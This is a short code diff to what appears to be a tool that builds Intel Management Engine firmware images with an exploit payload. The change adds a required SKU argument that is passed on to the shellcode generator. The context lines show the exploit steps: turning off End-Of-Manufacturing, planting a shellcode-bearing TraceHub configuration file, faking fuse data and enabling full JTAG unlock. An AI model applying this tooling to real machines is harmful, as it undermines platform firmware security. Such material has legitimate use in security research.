@@ -40,13 +40,13 @@ def generate_fitc_from_intel_and_delta(intel_cfg, delta_dir):
 
     return fitc_cfg
 
-def apply_exploit_to_fitc(fitc_cfg, version, pch, fake_fpfs, red_unlock):
+def apply_exploit_to_fitc(fitc_cfg, version, pch, sku, fake_fpfs, red_unlock):
     # Make sure End-Of-Manufacturing is off
     fitc_cfg.removeFile("/home/mca/eom")
     fitc_cfg.addFile("/home/mca/eom", b"\x00", CFG.strToMode(' --Irw-r-----'), CFG.strToOpt('?!-F'), 0, 238)
 
     # Generate TraceHub configuration file with exploit payload
-    ct_payload = GenerateShellCode(version, pch, fake_fpfs, red_unlock)
+    ct_payload = GenerateShellCode(version, pch, sku, fake_fpfs, red_unlock)
     # Add TraceHub configuration file
     fitc_cfg.removeFile("/home/bup/ct")
     fitc_cfg.addFile("/home/bup/ct", ct_payload, CFG.strToMode(' ---rwxr-----'), CFG.strToOpt('?--F'), 3, 351)
@@ -67,6 +67,7 @@ parser.add_argument("--output", required=True, help="Output ME image")
 parser.add_argument("--delta", required=True, help="MFS delta directory")
 parser.add_argument('--version', required=True, help='Donor ME version')
 parser.add_argument('--pch', required=True, help='PCH type')
+parser.add_argument('--sku', metavar='<ME SKU>', help='ME SKU', required=True)
 parser.add_argument('--fake-fpfs', help='replace SRAM copy of FPFs with the provided data')
 parser.add_argument('--red-unlock', help='allow full JTAG access to the entire platform', action='store_true')
 args = parser.parse_args()
@@ -95,7 +96,7 @@ intel_cfg = CFG(sysvol.getFile(INTEL_IDX).data)
 # Generate fitc.cfg
 fitc_cfg = generate_fitc_from_intel_and_delta(intel_cfg, args.delta)
 # Modify fitc.cfg with exploit
-apply_exploit_to_fitc(fitc_cfg, args.version, args.pch, fake_fpfs, args.red_unlock)
+apply_exploit_to_fitc(fitc_cfg, args.version, args.pch, args.sku, fake_fpfs, args.red_unlock)
 # Re-generate fitc.cfg
 fitc_cfg.generate(alignment=2)
 
